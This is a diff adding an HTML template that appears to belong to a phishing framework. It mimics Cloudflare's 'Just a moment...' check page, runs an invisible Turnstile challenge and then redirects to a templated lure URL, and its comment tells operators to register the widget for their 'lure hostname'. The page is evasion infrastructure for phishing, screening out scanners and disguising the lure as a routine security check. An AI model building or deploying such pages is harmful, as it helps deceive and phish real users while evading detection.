@@ -1,0 +1,28 @@
+<!--
+    1. Create a Turnstile site in Cloudflare for your lure hostname.
+    2. Widget Mode: Invisible (or Managed).
+    3. Replace sitekey below with your site key.
+-->
+<html>
+<head>
+    <title>Just a moment...</title>
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+    <style>
+        body { font-family: system-ui, sans-serif; display: flex; min-height: 100vh; align-items: center; justify-content: center; color: #202124; }
+    </style>
+</head>
+<body>
+Loading...
+<div id="cf-turnstile"></div>
+<script>
+turnstile.ready(function () {
+        turnstile.render('#cf-turnstile', {
+            sitekey: '1x00000000000000000000BB',
+            callback: function(token) {
+                window.location.assign({lure_url_js});
+            },
+        });
+    });
+</script>
+</body>
+</html>
